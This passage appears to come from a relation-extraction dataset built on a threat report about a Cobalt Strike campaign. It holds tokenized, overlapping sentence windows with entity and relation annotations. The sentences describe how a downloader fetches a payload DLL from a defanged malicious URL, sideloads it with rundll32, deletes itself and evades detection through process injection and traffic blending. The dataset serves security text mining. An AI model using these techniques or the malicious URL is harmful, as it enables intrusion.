"downloader", "command", "downloads", "a", "64-bit", "Windows", "executable", "and", "runs", "it", "as", "a", "process", "in", "the", "victim", "'s", "machine", "."], ["Stage", "4", "downloader", "executableThe", "downloader", "is", "a", "64-bit", "executable", "that", "runs", "as", "a", "process", "in", "the", "victim", "'s", "environment", "."], ["It", "executes", "the", "PowerShell", "command", ",", "which", "downloads", "the", "Cobalt", "Strike", "payload", "DLL", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "''", "to", "the", "userprofile", "local", "application", "temporary", "directory", "with", "a", "spoofed", "extension", ".png", "and", "sideloads", "the", "DLL", "using", "rundll32.exe", "."], ["Stage", "4", "downloader", "EXE", "."], ["The", "downloader", "also", "executes", "the", "ping", "command", "to", "the", "IP", "address", "1.1.1.1"], ["1", "and", "executes", "the", "delete", "command", "to", "delete", "itself", "."], ["The", "usage", "of", "ping", "command", "is", "to", "instill", "a", "delay", "before", "deleting", "the", "downloader", "."], ["Employing", "Cobalt", "Strike", "beacons", "in", "the", "attacks", "'", "infection", "chain", "allows", "the", "attackers", "to", "blend", "their", "malicious", "traffic", "with", "legitimate", "traffic", "and", "evade", "network", "detections", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "downloader", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "executable", "pos": [11, 12], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "it", "pos": [14, 15], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [17, 17], "name": "process", "pos": [17, 18], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "downloader", "pos": [4, 5], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "It", "pos": [0, 1], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [47, 47], "name": "PowerShell", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "payload DLL", "pos": [11, 13], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [61, 61], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "pos": [17, 23], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [83, 83], "name": "DLL", "pos": [39, 40], "index": "9_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [85, 85], "name": "rundll32.exe", "pos": [41, 42], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [93, 93], "name": "downloader", "pos": [1, 2], "index": "11_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [97, 97], "name": "ping", "pos": [5, 6], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [101, 101], "name": "IP address", "pos": [9, 11], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [103, 103], "name": "1.1.1.1", "pos": [11, 12], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [112, 112], "name": "itself", "pos": [8, 9], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [130, 130], "name": "Cobalt Strike", "pos": [1, 3], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [141, 141], "name": "attackers", "pos": [12, 13], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 3}, {"r": "EX", "evidence": [0], "t": 2, "h": 3}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 11}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 8}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "FR", "evidence": [2], "h": 6, "t": 10}, {"r": "EX", "evidence": [2], "t": 9, "h": 10}, {"r": "CO", "evidence": [2], "h": 7, "t": 9}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 7, "t": 15}, {"r": "FR", "evidence": [4], "h": 11, "t": 12}, {"r": "ST", "evidence": [4], "h": 12, "t": 13}, {"r": "RF", "evidence": [4], "h": 12, "t": 13}, {"r": "UK", "evidence": [4, 5], "h": 11, "t": 15}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 12, "t": 16}, {"r": "CO", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [7], "t": 16, "h": 17}, {"r": "WR", "evidence": [7], "t": 16, "h": 17}]}, {"title": "063-28", "sents": [["Stage", "4", "downloader", "executableThe", "downloader", "is", "a", "64-bit", "executable", "that", "runs", "as", "a", "process", "in", "the", "victim", "'s", "environment", "."], ["It", "executes", "the", "PowerShell", "command", ",", "which", "downloads", "the", "Cobalt", "Strike", "payload", "DLL", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "''", "to", "the", "userprofile", "local", "application", "temporary", "directory", "with", "a", "spoofed", "extension", ".png", "and", "sideloads", "the", "DLL", "using", "rundll32.exe", "."], ["Stage", "4", "downloader", "EXE", "."], ["The", "downloader", "also", "executes", "the", "ping", "command", "to", "the", "IP", "address", "1.1.1.1"], ["1", "and", "executes", "the", "delete", "command", "to", "delete", "itself", "."], ["The", "usage", "of", "ping", "command", "is", "to", "instill", "a", "delay", "before", "deleting", "the", "downloader", "."], ["Employing", "Cobalt", "Strike", "beacons", "in", "the", "attacks", "'", "infection", "chain", "allows", "the", "attackers", "to", "blend", "their", "malicious", "traffic", "with", "legitimate", "traffic", "and", "evade", "network", "detections", "."], ["Also", ",", "with", "its", "capabilities", "to", "configure", "commands", "in", "the", "beacon", "configuration", ",", "the", "attacker", "can", "perform", "various", "malicious", "operations", "such", "as", "injecting", "other", "malicious", "binary", "into", "the", "running", "processes", "of", "the", "infected", "machines", "and", "can", "avoid", "having", "a", "separate", "injection", "module", "implants", "in", "their", "infection", "chain", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "downloader", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "It", "pos": [0, 1], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [23, 23], "name": "PowerShell", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "payload DLL", "pos": [11, 13], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [37, 37], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "pos": [17, 23], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [59, 59], "name": "DLL", "pos": [39, 40], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [61, 61], "name": "rundll32.exe", "pos": [41, 42], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "downloader", "pos": [1, 2], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [73, 73], "name": "ping", "pos": [5, 6], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [77, 77], "name": "IP address", "pos": [9, 11], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [79, 79], "name": "1.1.1.1", "pos": [11, 12], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [88, 88], "name": "itself", "pos": [8, 9], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [106, 106], "name": "Cobalt Strike", "pos": [1, 3], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [117, 117], "name": "attackers", "pos": [12, 13], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [145, 145], "name": "attacker", "pos": [14, 15], "index": "14_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "ST", "evidence": [1], "h": 2, "t": 4}, {"r": "RF", "evidence": [1], "h": 2, "t": 4}, {"r": "FR", "evidence": [1], "h": 2, "t": 6}, {"r": "EX", "evidence": [1], "t": 5, "h": 6}, {"r": "CO", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 3, "t": 11}, {"r": "FR", "evidence": [3], "h": 7, "t": 8}, {"r": "ST", "evidence": [3], "h": 8, "t": 9}, {"r": "RF", "evidence": [3], "h": 8, "t": 9}, {"r": "UK", "evidence": [3, 4], "h": 7, "t": 11}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 8, "t": 12}, {"r": "CO", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [6], "t": 12, "h": 13}, {"r": "WR", "evidence": [6], "t": 12, "h": 13}, {"r": "WR", "evidence": [6, 7], "t": 12, "h": 14}]}, {"title": "063-29", "sents": [["It", "executes", "the", "PowerShell", "command", ",", "which", "downloads", "the", "Cobalt", "Strike", "payload", "DLL", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "''", "to", "the", "userprofile", "local", "application", "temporary", "directory", "with", "a", "spoofed", "extension", ".png", "and", "sideloads", "the", "DLL", "using", "rundll32.exe", "."], ["Stage", "4", "downloader", "EXE", "."], ["The", "downloader", "also", "executes", "the", "ping", "command", "to", "the", "IP", "address", "1.1.1.1"], ["1", "and", "executes", "the", "delete", "command", "to", "delete", "itself", "."], ["The", "usage", "of", "ping", "command", "is", "to", "instill", "a", "delay", "before", "deleting", "the", "downloader", "."], ["Employing", "Cobalt", "Strike", "beacons", "in", "the", "attacks", "'", "infection", "chain", "allows", "the", "attackers", "to", "blend", "their", "malicious", "traffic", "with", "legitimate", "traffic", "and", "evade", "network", "detections", "."], ["Also", ",", "with", "its", "capabilities", "to", "configure", "commands", "in", "the", "beacon", "configuration", ",", "the", "attacker", "can", "perform", "various", "malicious", "operations", "such", "as", "injecting", "other", "malicious", "binary", "into", "the", "running", "processes", "of", "the", "infected", "machines", "and", "can", "avoid", "having", "a", "separate", "injection", "module", "implants", "in", "their", "infection", "chain", "."], ["The", "Cobalt", "Strike", "beacon", "configurations", "of", "this", "campaign", "showed", "us", "various", "characteristics", "of", "the", "beacon", "binary", ":", "C2", "server", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [3, 3], "name": "PowerShell", "pos": [3, 4], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "payload DLL", "pos": [11, 13], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [17, 17], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "pos": [17, 23], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [39, 39], "name": "DLL", "pos": [39, 40], "index": "4_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [41, 41], "name": "rundll32.exe", "pos": [41, 42], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [49, 49], "name": "downloader", "pos": [1, 2], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [53, 53], "name": "ping", "pos": [5, 6], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [57, 57], "name": "IP address", "pos": [9, 11], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [59, 59], "name": "1.1.1.1", "pos": [11, 12], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "itself", "pos": [8, 9], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [86, 86], "name": "Cobalt Strike", "pos": [1, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [97, 97], "name": "attackers", "pos": [12, 13], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [125, 125], "name": "attacker", "pos": [14, 15], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [160, 160], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "14_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [0], "h": 1, "t": 3}, {"r": "RF", "evidence": [0], "h": 1, "t": 3}, {"r": "FR", "evidence": [0], "h": 1, "t": 5}, {"r": "EX", "evidence": [0], "t": 4, "h": 5}, {"r": "CO", "evidence": [0], "h": 2, "t": 4}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 2, "t": 10}, {"r": "FR", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 7, "t": 8}, {"r": "RF", "evidence": [2], "h": 7, "t": 8}, {"r": "UK", "evidence": [2, 3], "h": 6, "t": 10}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 7, "t": 11}, {"r": "CO", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [5], "t": 11, "h": 12}, {"r": "WR", "evidence": [5], "t": 11, "h": 12}, {"r": "WR", "evidence": [5, 6], "t": 11, "h": 13}, {"r": "WR", "evidence": [5, 6, 7], "t": 11, "h": 14}]}, {"title": "063-30", "sents": [["Stage", "4", "downloader", "EXE", "."], ["The", "downloader", "also", "executes", "the", "ping", "command", "to", "the", "IP", "address", "1.1.1.1"], ["1", "and", "executes", "the", "delete", "command", "to", "delete", "itself", "."], ["The", "usage", "of", "ping", "command", "is", "to", "instill", "a", "delay", "before", "deleting", "the", "downloader", "."], ["Employing", "Cobalt", "Strike", "beacons", "in", "the", "attacks", "'", "infection", "chain", "allows", "the", "attackers", "to", "blend", "their", "malicious", "traffic", "with", "legitimate", "traffic", "and", "evade", "network", "detections", "."], ["Also", ",", "with", "its", "capabilities", "to", "configure", "commands", "in", "the", "beacon", "configuration", ",", "the", "attacker", "can", "perform", "various", "malicious", "operations", "such", "as", "injecting", "other", "malicious", "binary", "into", "the", "running", "processes", "of", "the", "infected", "machines", "and", "can", "avoid", "having", "a", "separate", "injection", "module", "implants", "in", "their", "infection", "chain", "."], ["The", "Cobalt", "Strike", "beacon", "configurations", "of", "this", "campaign", "showed", "us", "various", "characteristics", "of", "the", "beacon", "binary", ":", "C2", "server", "."], ["Target", "process", "to", "spawn", "for", "x86", "and", "x64", "processes", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [6, 6], "name": "downloader", "pos": [1, 2], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [10, 10], "name": "ping", "pos": [5, 6], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [14, 14], "name": "IP address", "pos": [9, 11], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [16, 16], "name": "1.1.1.1", "pos": [11, 12], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [25, 25], "name": "itself", "pos": [8, 9], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [43, 43], "name": "Cobalt Strike", "pos": [1, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [54, 54], "name": "attackers", "pos": [12, 13], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [82, 82], "name": "attacker", "pos": [14, 15], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [117, 117], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "8_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 0, "t": 1}, {"r": "ST", "evidence": [1], "h": 1, "t": 2}, {"r": "RF", "evidence": [1], "h": 1, "t": 2}, {"r": "UK", "evidence": [1, 2], "h": 0, "t": 4}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 1, "t": 5}, {"r": "CO", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [4], "t": 5, "h": 6}, {"r": "WR", "evidence": [4], "t": 5, "h": 6}, {"r": "WR", "evidence": [4, 5], "t": 5, "h": 7}, {"r": "WR", "evidence": [4, 5, 6], "t": 5, "h": 8}]}, {"title": "063-31", "sents": [["The", "downloader", "also", "executes", "the", "ping", "command", "to", "the", "IP", "address", "1.1.1.1"], ["1", "and", "executes", "the", "delete", "command", "to", "delete", "itself", "."], ["The", "usage", "of", "ping", "command", "is", "to", "instill", "a", "delay", "before", "deleting", "the", "downloader", "."], ["Employing", "Cobalt", "Strike", "beacons", "in", "the", "attacks", "'", "infection", "chain", "allows", "the", "attackers", "to", "blend", "their", "malicious", "traffic", "with", "legitimate", "traffic", "and", "evade", "network", "detections", "."], ["Also", ",", "with", "its", "capabilities", "to", "configure", "commands", "in", "the", "beacon", "configuration", ",", "the", "attacker", "can", "perform", "various", "malicious", "operations", "such", "as", "injecting", "other", "malicious", "binary", "into", "the", "running", "processes", "of", "the", "infected", "machines", "and", "can", "avoid", "having", "a", "separate", "injection", "module", "implants", "in", "their", "infection", "chain", "."], ["The", "Cobalt", "Strike", "beacon", "configurations", "of", "this", "campaign", "showed", "us", "various", "characteristics", "of", "the", "beacon", "binary", ":", "C2", "server", "."], ["Target", "process", "to", "spawn", "for", "x86", "and", "x64", "processes", "."], ["The", "Cobalt", "Strike", "beacon", "used", "in", "this", "campaign", "has", "the", "following", "capabilities", ":", "Executes", "arbitrary", "codes", "in", "the", "target", "processes", "through", "process", "injection", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "downloader", "pos": [1, 2], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [5, 5], "name": "ping", "pos": [5, 6], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "IP address", "pos": [9, 11], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [11, 11], "name": "1.1.1.1", "pos": [11, 12], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "itself", "pos": [8, 9], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [38, 38], "name": "Cobalt Strike", "pos": [1, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [49, 49], "name": "attackers", "pos": [12, 13], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [77, 77], "name": "attacker", "pos": [14, 15], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [112, 112], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [142, 142], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [156, 156], "name": "codes", "pos": [15, 16], "index": "10_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [160, 160], "name": "processes", "pos": [19, 20], "index": "11_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "UK", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 1, "t": 5}, {"r": "CO", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [3], "t": 5, "h": 6}, {"r": "WR", "evidence": [3], "t": 5, "h": 6}, {"r": "FR", "evidence": [3, 4, 5, 6, 7], "h": 6, "t": 11}, {"r": "WR", "evidence": [3, 4], "t": 5, "h": 7}, {"r": "WR", "evidence": [3, 4, 5], "t": 5, "h": 8}, {"r": "CO", "evidence": [5, 6, 7], "h": 8, "t": 9}, {"r": "IJ", "evidence": [7], "h": 9, "t": 11}, {"r": "EX", "evidence": [7], "t": 10, "h": 11}]}, {"title": "063-32", "sents": [["1", "and", "executes", "the", "delete", "command", "to", "delete", "itself", "."], ["The", "usage", "of", "ping", "command", "is", "to", "instill", "a", "delay", "before", "deleting", "the", "downloader", "."], ["Employing", "Cobalt", "Strike", "beacons", "in", "the", "attacks", "'", "infection", "chain", "allows", "the", "attackers", "to", "blend", "their", "malicious", "traffic", "with", "legitimate", "traffic", "and", "evade", "network", "detections", "."], ["Also", ",", "with", "its", "capabilities", "to", "configure", "commands", "in", "the", "beacon", "configuration", ",", "the", "attacker", "can", "perform", "various", "malicious", "operations", "such", "as", "injecting", "other", "malicious", "binary", "into", "the", "running", "processes", "of", "the", "infected", "machines", "and", "can", "avoid", "having", "a", "separate", "injection", "module", "implants", "in", "their", "infection", "chain", "."], ["The", "Cobalt", "Strike", "beacon", "configurations", "of", "this", "campaign", "showed", "us", "various", "characteristics", "of", "the", "beacon", "binary", ":", "C2", "server", "."], ["Target", "process", "to", "spawn", "for", "x86", "and", "x64", "processes", "."], ["The", "Cobalt", "Strike", "beacon", "used", "in", "this", "campaign", "has", "the", "following", "capabilities", ":", "Executes", "arbitrary", "codes", "in", "the", "target", "processes", "through", "process", "injection", "."], ["Target", "processes", "described", "in", "the", "beacon", "configuration", "related", "to", "this", "campaign", "include", ":", "x86", ":", "''", "%", "windir", "%", "\\syswow64\\dns-sd.exe", "''", "''", "%", "windir", "%", "\\syswow64", "undll32.exe", "''", "''", "%", "windir", "%", "\\syswow64\\dllhost.exe", "-o", "enable", "''", "x64", ":", "''", "%", "windir", "%", "\\sysnative\\getmac.exe", "/V", "''", "''", "%", "windir", "%", "\\sysnative", "undll32.exe", "''", "''", "%", "windir", "%", "\\sysnative\\DeviceParingWizard.exe", "''", "A", "high-reputation", "domain", "defined", "in", "the", "HostHeader", "component", "of", "the", "beacon", "configuration", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "itself", "pos": [8, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [26, 26], "name": "Cobalt Strike", "pos": [1, 3], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [37, 37], "name": "attackers", "pos": [12, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [65, 65], "name": "attacker", "pos": [14, 15], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [100, 100], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "4_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [130, 130], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "5_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [144, 144], "name": "codes", "pos": [15, 16], "index": "6_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [148, 148], "name": "processes", "pos": [19, 20], "index": "7_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [154, 154], "name": "processes", "pos": [1, 2], "index": "8_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [169, 169], "name": "% windir % \\syswow64\\dns-sd.exe", "pos": [16, 20], "index": "9_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [175, 175], "name": "% windir % \\syswow64 undll32.exe", "pos": [22, 27], "index": "10_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [182, 182], "name": "% windir % \\syswow64\\dllhost.exe", "pos": [29, 33], "index": "11_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [192, 192], "name": "% windir % \\sysnative\\getmac.exe", "pos": [39, 43], "index": "12_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [199, 199], "name": "% windir % \\sysnative undll32.exe", "pos": [46, 51], "index": "13_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [206, 206], "name": "% windir % \\sysnative\\DeviceParingWizard.exe", "pos": [53, 57], "index": "14_0"}]], "labels": [{"r": "WR", "evidence": [2], "t": 1, "h": 2}, {"r": "WR", "evidence": [2], "t": 1, "h": 2}, {"r": "FR", "evidence": [2, 3, 4, 5, 6], "h": 2, "t": 7}, {"r": "WR", "evidence": [2, 3], "t": 1, "h": 3}, {"r": "WR", "evidence": [2, 3, 4], "t": 1, "h": 4}, {"r": "CO", "evidence": [4, 5, 6], "h": 4, "t": 5}, {"r": "IJ", "evidence": [6], "h": 5, "t": 7}, {"r": "EX", "evidence": [6], "t": 6, "h": 7}, {"r": "CO", "evidence": [6, 7], "h": 7, "t": 8}, {"r": "CO", "evidence": [6, 7], "h": 7, "t": 9}, {"r": "WR", "evidence": [6, 7], "t": 6, "h": 10}, {"r": "WR", "evidence": [6, 7], "t": 6, "h": 11}, {"r": "WR", "evidence": [6, 7], "t": 6, "h": 12}, {"r": "WR", "evidence": [6, 7], "t": 6, "h": 13}, {"r": "WR", "evidence": [6, 7], "t": 6, "h": 14}]}, {"title": "063-33", "sents": [["The", "usage", "of", "ping", "command", "is", "to", "instill", "a", "delay", "before", "deleting", "the", "downloader", "."], ["Employing", "Cobalt", "Strike", "beacons", "in", "the", "attacks", "'", "infection", "chain", "allows", "the", "attackers", "to", "blend", "their", "malicious", "traffic", "with", "legitimate", "traffic", "and", "evade", "network", "detections", "."], ["Also", ",", "with", "its", "capabilities", "to", "configure", "commands", "in", "the", "beacon", "configuration", ",", "the", "attacker", "can", "perform", "various", "malicious", "operations", "such", "as", "injecting", "other", "malicious", "binary", "into", "the", "running", "processes", "of", "the", "infected", "machines", "and", "can", "avoid", "having", "a", "separate", "injection", "module", "implants", "in", "their", "infection", "chain", "."], ["The", "Cobalt", "Strike", "beacon", "configurations", "of", "this", "campaign", "showed", "us", "various", "characteristics", "of", "the", "beacon", "binary", ":", "C2", "server", "."], ["Target", "process", "to", "spawn", "for", "x86", "and", "x64", "processes", "."], ["The", "Cobalt", "Strike", "beacon", "used", "in", "this", "campaign", "has", "the", "following", "capabilities", ":", "Executes", "arbitrary", "codes", "in", "the", "target", "processes", "through", "process", "injection", "."], ["Target", "processes", "described", "in", "the", "beacon", "configuration", "related", "to", "this", "campaign", "include", ":", "x86", ":", "''", "%", "windir", "%", "\\syswow64\\dns-sd.exe", "''", "''", "%", "windir", "%", "\\syswow64", "undll32.exe", "''", "''", "%", "windir", "%", "\\syswow64\\dllhost.exe", "-o", "enable", "''", "x64", ":", "''", "%", "windir", "%", "\\sysnative\\getmac.exe", "/V", "''", "''", "%", "windir", "%", "\\sysnative", "undll32.exe", "''", "''", "%", "windir", "%", "\\sysnative\\DeviceParingWizard.exe", "''", "A", "high-reputation", "domain", "defined", "in", "the", "HostHeader", "component", "of", "the", "beacon", "configuration", "."], ["The", "actor", "is", "using", "this", "redirector", "technique", "to", "make", "the", "beacon", "traffic", "appear", "legitimate", "and", "avoid", "detection", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [16, 16], "name": "Cobalt Strike", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "attackers", "pos": [12, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "attacker", "pos": [14, 15], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [120, 120], "name": "Cobalt Strike beacon", "pos": [1, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [134, 134], "name": "codes", "pos": [15, 16], "index": "5_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [138, 138], "name": "processes", "pos": [19, 20], "index": "6_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [144, 144], "name": "processes", "pos": [1, 2], "index": "7_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [159, 159], "name": "% windir % \\syswow64\\dns-sd.exe", "pos": [16, 20], "index": "8_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [165, 165], "name": "% windir % \\syswow64 undll32.exe", "pos": [22, 27], "index": "9_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [172, 172], "name": "% windir % \\syswow64\\dllhost.exe", "pos": [29, 33], "index": "10_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [182, 182], "name": "% windir % \\sysnative\\getmac.exe", "pos": [39, 43], "index": "11_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [189, 189], "name": "% windir % \\sysnative undll32.exe", "pos": [46, 51], "index": "12_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [196, 196], "name": "% windir % \\sysnative\\DeviceParingWizard.exe", "pos": [53, 57], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [1], "t": 0, "h": 1}, {"r": "WR", "evidence": [1], "t": 0, "h": 1}, {"r": "FR", "evidence": [1, 2, 3, 4, 5], "h": 1, "t": 6}, {"r": "WR", "evidence": [1, 2], "t": 0, "h": 2}, {"r": "WR", "evidence": [1, 2, 3], "t": 0, "h": 3}, {"r": "CO", "evidence": [3, 4, 5], "h": 3, "t": 4}, {"r": "IJ", "evidence": [5], "h": 4, "t": 6}, {"r": "EX", "evidence": [5], "t": 5, "h": 6}, {"r": "CO", "evidence": [5, 6], "h": 6, "t": 7}, {"r": "CO", "evidence": [5, 6], "h": 6, "t": 8}, {"r": "WR", "evidence": [5, 6], "t": 5, "h": 9}, {"r": "WR", "evidence": [5, 6], "t": 5, "h": 10}, {"r": "WR", "evidence": [5, 6], "t": 5, "h": 11}, {"r": "WR", "evidence": [5, 6], "t": 5, "h": 12}, {"r": "WR", "evidence": [5, 6], "t": 5, "h": 13}]}, {"title": "063-34", "sents": [["Employing", "Cobalt", "Strike", "beacons", "in", "the", "attacks", "'", "infection", "chain", "allows", "the", "attackers", "to", "blend", "their", "malicious", "traffic", "with", "legitimate", 